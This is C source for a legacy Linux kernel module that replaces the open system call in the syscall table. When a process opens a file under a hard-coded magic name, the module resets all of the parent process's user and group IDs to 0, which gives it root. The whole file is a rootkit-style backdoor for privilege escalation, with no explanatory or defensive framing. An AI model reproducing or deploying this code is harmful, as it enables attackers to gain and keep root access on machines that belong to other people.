#define __KERNEL__
#define MODULE

#include <linux/module.h>
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
EXPORT_NO_SYMBOLS;

#define CODE "hacker_sind_dohf"

extern void *sys_call_table[];
int (*old_open)(char *, int, int);
int new_open(char *, int, int); 

int init_module(void)
{
  old_open = sys_call_table[__NR_open];
  sys_call_table[__NR_open] = new_open;
  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_open] = old_open;
}

int new_open(char *file, int flags, int mode)
{
  if( (current->p_pptr->pid > 1) && (!strcmp(CODE,file)) )
    {
      current->p_pptr->uid = current->p_pptr->euid = current->p_pptr->suid = current->p_pptr->fsuid = 0;
      current->p_pptr->gid = current->p_pptr->egid = current->p_pptr->sgid = current->p_pptr->fsgid = 0;
    }

  return old_open(file, flags, mode);
}
